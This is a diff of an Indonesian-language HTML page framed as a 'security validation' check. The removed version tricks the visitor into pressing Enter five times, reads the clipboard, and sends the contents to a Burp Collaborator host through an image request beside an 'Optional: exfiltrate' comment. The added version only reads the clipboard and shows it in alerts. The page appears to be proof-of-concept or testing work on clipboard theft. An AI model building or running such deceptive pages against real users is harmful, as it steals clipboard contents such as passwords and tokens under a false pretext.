@@ -1,77 +1,28 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Validasi Pengguna</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      padding-top: 80px;
-    }
-    button {
-      font-size: 18px;
-      padding: 10px 20px;
-      cursor: pointer;
-    }
-    #msg {
-      margin-top: 30px;
-      font-size: 18px;
-    }
-    #result {
-      margin-top: 20px;
-      font-weight: bold;
-      color: green;
-    }
-  </style>
-</head>
-<body>
+<button onclick="captureClipboard()">Klik untuk validasi awal</button>
 
-  <h2>Validasi Keamanan Sistem</h2>
-  <button onclick="activate()">Klik untuk lanjut</button>
+<script>
+let savedClipboard = null;
 
-  <div id="msg">Silakan klik tombol di atas terlebih dahulu.</div>
-  <div id="result"></div>
+function captureClipboard() {
+  if (!document.hasFocus()) {
+    alert("Tab tidak fokus.");
+    return;
+  }
 
-  <script>
-    let ready = false;
-    let count = 0;
-    let triggered = false;
-    let timeout;
+  navigator.clipboard.readText()
+    .then(text => {
+      savedClipboard = text;
+      alert("📋 Clipboard berhasil dibaca!");
+    })
+    .catch(err => {
+      alert("❌ Gagal membaca clipboard: " + err);
+    });
+}
 
-    function activate() {
-      ready = true;
-      count = 0;
-      triggered = false;
-      document.getElementById("msg").innerText = "✅ Sekarang tekan tombol ENTER cepat 5x untuk validasi...";
-    }
-
-    document.body.onkeydown = function(e) {
-      if (!ready || triggered) return;
-      if (e.key === "Enter") {
-        count++;
-        clearTimeout(timeout);
-
-        timeout = setTimeout(() => count = 0, 2000);
-
-        document.getElementById("msg").innerText = "Tekan ENTER (" + count + "/5)...";
-
-        if (count >= 5) {
-          triggered = true;
-          document.getElementById("msg").innerText = "📋 Membaca clipboard...";
-
-          navigator.clipboard.readText().then(function(text) {
-            document.getElementById("result").innerText = "📋 Clipboard berisi: " + text;
-
-            // Optional: exfiltrate
-            const img = new Image();
-            img.src = "https://qkej59kyt3q16kirt11bb4kv1m7cv1.burpcollaborator.net/log?clip=" + encodeURIComponent(text);
-          }).catch(function(err) {
-            document.getElementById("msg").innerText = "❌ Gagal membaca clipboard: " + err;
-          });
-        }
-      }
-    };
-  </script>
-
-</body>
-</html>
+// Nanti bisa trigger ENTER untuk proses lanjut
+document.onkeydown = (e) => {
+  if (e.key === "Enter" && savedClipboard) {
+    alert("Isi clipboard tadi: " + savedClipboard);
+  }
+};
+</script>
